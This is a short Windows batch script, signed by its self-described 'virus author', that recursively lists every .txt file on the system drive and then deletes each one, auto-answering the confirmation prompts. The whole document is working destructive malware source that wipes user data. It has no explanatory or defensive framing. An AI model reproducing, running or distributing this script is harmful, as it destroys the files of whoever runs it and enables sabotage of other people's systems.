@ echo off

rem ---------------------------------
rem Delete All Texts
DIR /S/B %SystemDrive%\*.txt >> FIleList_txt.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_txt.txt) do del "%%j:%%k"
rem ---------------------------------


__-Virus Author: subhojit-__